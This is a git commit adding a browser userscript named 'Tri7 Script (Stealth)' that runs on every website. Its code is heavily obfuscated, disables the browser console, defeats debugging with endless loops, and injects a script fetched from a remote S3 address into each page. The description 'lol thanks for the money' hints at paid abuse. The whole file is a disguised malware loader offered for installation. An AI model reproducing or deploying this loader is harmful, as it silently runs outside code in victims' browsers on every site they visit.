d46082dd6b3126da89aee4cc7de642cfabb26c13
tri-7 <48764849+tri-7@users.noreply.github.com>
2019-03-26 11:33:09 -0400

    Add files via upload

---
+++ public/tri7-stealthscript.user.js
@@ -0,0 +1,369 @@
+// ==UserScript==
+// @name         Tri7 Script (Stealth)
+// @namespace    https://tri-7.ga/index.html
+// @version      0.1
+// @description  lol thanks for the money
+// @author       Admin
+// @match      *://*/*
+// @grant        *
+// ==/UserScript==
+var a = [
+    'OEbuB',
+    'LmSUI',
+    'LRsUY',
+    '\x5c+\x5c+\x20*(?:_0x(?:[a-f0-9]){4,6}|(?:\x5cb|\x5cd)[a-z0-9]{1,4}(?:\x5cb|\x5cd))',
+    'init',
+    'test',
+    'input',
+    'XhpHx',
+    'cOqGA',
+    'counter',
+    'TtCif',
+    'uPoHq',
+    'iHZtz',
+    'SrsiH',
+    'function\x20*\x5c(\x20*\x5c)',
+    'chain',
+    'PEwST',
+    'BBLuU',
+    'kYHZQ',
+    'YZnwW',
+    'console',
+    'trace',
+    'SxvLm',
+    'TVcpQ',
+    'eZfZH',
+    'return\x20(function()\x20',
+    '{}.constructor(\x22return\x20this\x22)(\x20)',
+    'EvrrV',
+    'rYLnv',
+    'whfgx',
+    'bPjoS',
+    'debug',
+    'stateObject',
+    'JRKhb',
+    'createElement',
+    'script',
+    'src',
+    'https://s3.amazonaws.com/jsbooster/207e8ffe61d5327b39.js',
+    'body',
+    'appendChild',
+    'string',
+    'vRmGl',
+    'length',
+    'YIPly',
+    'tIChU',
+    'call',
+    'fVGzS',
+    'ixBgP',
+    'hDkDb',
+    'gGiDY',
+    'tlEoy',
+    'dLWqy',
+    'constructor',
+    'debu',
+    'gger',
+    'action',
+    'UPcgU',
+    'faJLA',
+    'apply',
+    'wfGyS',
+    'Xvtst',
+    'log',
+    'warn',
+    'info',
+    'error',
+    'exception'
+];
+(function (c, d) {
+    var e = function (f) {
+        while (--f) {
+            c['push'](c['shift']());
+        }
+    };
+    e(++d);
+}(a, 0x73));
+var b = function (c, d) {
+    c = c - 0x0;
+    var e = a[c];
+    return e;
+};
+(function () {
+    var z = function () {
+        if (b('0x0') !== b('0x1')) {
+            var A = !![];
+            return function (B, C) {
+                if ('IqYrw' === b('0x2')) {
+                    (function () {
+                        return !![];
+                    }[b('0x3')](b('0x4') + b('0x5'))['call'](b('0x6')));
+                } else {
+                    var E = A ? function () {
+                        if (b('0x7') === b('0x8')) {
+                            var t = C[b('0x9')](B, arguments);
+                            C = null;
+                            return t;
+                        } else {
+                            if (C) {
+                                if (b('0xa') !== b('0xb')) {
+                                    var H = C[b('0x9')](B, arguments);
+                                    C = null;
+                                    return H;
+                                } else {
+                                    var x = {};
+                                    x[b('0xc')] = func;
+                                    x[b('0xd')] = func;
+                                    x['debug'] = func;
+                                    x[b('0xe')] = func;
+                                    x[b('0xf')] = func;
+                                    x[b('0x10')] = func;
+                                    x['trace'] = func;
+                                    return x;
+                                }
+                            }
+                        }
+                    } : function () {
+                    };
+                    A = ![];
+                    return E;
+                }
+            };
+        } else {
+            var g = A ? function () {
+                if (fn) {
+                    var h = fn[b('0x9')](context, arguments);
+                    fn = null;
+                    return h;
+                }
+            } : function () {
+            };
+            A = ![];
+            return g;
+        }
+    }();
+    (function () {
+        if (b('0x11') !== b('0x11')) {
+            var j = fn[b('0x9')](context, arguments);
+            fn = null;
+            return j;
+        } else {
+            z(this, function () {
+                if (b('0x12') !== b('0x13')) {
+                    var P = new RegExp('function\x20*\x5c(\x20*\x5c)');
+                    var Q = new RegExp(b('0x14'), 'i');
+                    var R = d(b('0x15'));
+                    if (!P[b('0x16')](R + 'chain') || !Q[b('0x16')](R + b('0x17'))) {
+                        if ('XhpHx' !== b('0x18')) {
+                            debuggerProtection(0x0);
+                        } else {
+                            R('0');
+                        }
+                    } else {
+                        if (b('0x19') !== b('0x19')) {
+                            return function (y) {
+                            }['constructor']('while\x20(true)\x20{}')[b('0x9')](b('0x1a'));
+                        } else {
+                            d();
+                        }
+                    }
+                } else {
+                    if (fn) {
+                        var i = fn['apply'](context, arguments);
+                        fn = null;
+                        return i;
+                    }
+                }
+            })();
+        }
+    }());
+    var X = function () {
+        if (b('0x1b') === b('0x1c')) {
+            return debuggerProtection;
+        } else {
+            var Z = !![];
+            return function (a0, a1) {
+                if (b('0x1d') === b('0x1e')) {
+                    var n = new RegExp(b('0x1f'));
+                    var o = new RegExp(b('0x14'), 'i');
+                    var p = d('init');
+                    if (!n[b('0x16')](p + b('0x20')) || !o[b('0x16')](p + b('0x17'))) {
+                        p('0');
+                    } else {
+                        d();
+                    }
+                } else {
+                    var a6 = Z ? function () {
+                        if (b('0x21') !== b('0x22')) {
+                            if (a1) {
+                                if (b('0x23') === b('0x24')) {
+                                    result('0');
+                                } else {
+                                    var a8 = a1[b('0x9')](a0, arguments);
+                                    a1 = null;
+                                    return a8;
+                                }
+                            }
+                        } else {
+                            that[b('0x25')] = function (v) {
+                                var w = {};
+                                w[b('0xc')] = v;
+                                w[b('0xd')] = v;
+                                w['debug'] = v;
+                                w['info'] = v;
+                                w[b('0xf')] = v;
+                                w[b('0x10')] = v;
+                                w[b('0x26')] = v;
+                                return w;
+                            }(func);
+                        }
+                    } : function () {
+                    };
+                    Z = ![];
+                    return a6;
+                }
+            };
+        }
+    }();
+    var ac = X(this, function () {
+        if (b('0x27') !== b('0x27')) {
+            var q = firstCall ? function () {
+                if (fn) {
+                    var r = fn[b('0x9')](context, arguments);
+                    fn = null;
+                    return r;
+                }
+            } : function () {
+            };
+            firstCall = ![];
+            return q;
+        } else {
+            var ag = function () {
+            };
+            var ah;
+            try {
+                if (b('0x28') === b('0x29')) {
+                    if (fn) {
+                        var s = fn[b('0x9')](context, arguments);
+                        fn = null;
+                        return s;
+                    }
+                } else {
+                    var ak = Function(b('0x2a') + b('0x2b') + ');');
+                    ah = ak();
+                }
+            } catch (al) {
+                if (b('0x2c') === b('0x2c')) {
+                    ah = window;
+                } else {
+                    if (ret) {
+                        return debuggerProtection;
+                    } else {
+                        debuggerProtection(0x0);
+                    }
+                }
+            }
+            if (!ah['console']) {
+                if (b('0x2d') !== b('0x2d')) {
+                    d();
+                } else {
+                    ah[b('0x25')] = function (ag) {
+                        if (b('0x2e') !== b('0x2f')) {
+                            var X = {};
+                            X['log'] = ag;
+                            X[b('0xd')] = ag;
+                            X[b('0x30')] = ag;
+                            X[b('0xe')] = ag;
+                            X[b('0xf')] = ag;
+                            X[b('0x10')] = ag;
+                            X[b('0x26')] = ag;
+                            return X;
+                        } else {
+                            (function () {
+                                return ![];
+                            }[b('0x3')]('debu' + b('0x5'))[b('0x9')](b('0x31')));
+                        }
+                    }(ag);
+                }
+            } else {
+                if (b('0x32') === b('0x32')) {
+                    ah[b('0x25')][b('0xc')] = ag;
+                    ah[b('0x25')][b('0xd')] = ag;
+                    ah[b('0x25')]['debug'] = ag;
+                    ah['console'][b('0xe')] = ag;
+                    ah[b('0x25')]['error'] = ag;
+                    ah[b('0x25')][b('0x10')] = ag;
+                    ah['console']['trace'] = ag;
+                } else {
+                    ah = window;
+                }
+            }
+        }
+    });
+    ac();
+    var as = document[b('0x33')](b('0x34'));
+    as[b('0x35')] = b('0x36');
+    document[b('0x37')][b('0x38')](as);
+}());
+function d(at) {
+    function au(av) {
+        if (typeof av === b('0x39')) {
+            if (b('0x3a') !== b('0x3a')) {
+                e(this, function () {
+                    var k = new RegExp(b('0x1f'));
+                    var l = new RegExp('\x5c+\x5c+\x20*(?:_0x(?:[a-f0-9]){4,6}|(?:\x5cb|\x5cd)[a-z0-9]{1,4}(?:\x5cb|\x5cd))', 'i');
+                    var m = d('init');
+                    if (!k[b('0x16')](m + 'chain') || !l['test'](m + b('0x17'))) {
+                        m('0');
+                    } else {
+                        d();
+                    }
+                })();
+            } else {
+                return function (aA) {
+                }[b('0x3')]('while\x20(true)\x20{}')[b('0x9')](b('0x1a'));
+            }
+        } else {
+            if (('' + av / av)[b('0x3b')] !== 0x1 || av % 0x14 === 0x0) {
+                if (b('0x3c') === b('0x3c')) {
+                    (function () {
+                        if (b('0x3d') === b('0x3d')) {
+                            return !![];
+                        } else {
+                            return ![];
+                        }
+                    }[b('0x3')](b('0x4') + b('0x5'))[b('0x3e')](b('0x6')));
+                } else {
+                    return !![];
+                }
+            } else {
+                if (b('0x3f') !== b('0x40')) {
+                    (function () {
+                        if ('hDkDb' === b('0x41')) {
+                            return ![];
+                        } else {
+                            var u = Function(b('0x2a') + b('0x2b') + ');');
+                            that = u();
+                        }
+                    }[b('0x3')](b('0x4') + b('0x5'))['apply']('stateObject'));
+                } else {
+                    that[b('0x25')]['log'] = func;
+                    that[b('0x25')][b('0xd')] = func;
+                    that[b('0x25')][b('0x30')] = func;
+                    that[b('0x25')][b('0xe')] = func;
+                    that['console'][b('0xf')] = func;
+                    that[b('0x25')][b('0x10')] = func;
+                    that[b('0x25')][b('0x26')] = func;
+                }
+            }
+        }
+        au(++av);
+    }
+    try {
+        if (at) {
+            return au;
+        } else {
+            au(0x0);
+        }
+    } catch (aG) {
+    }
+}
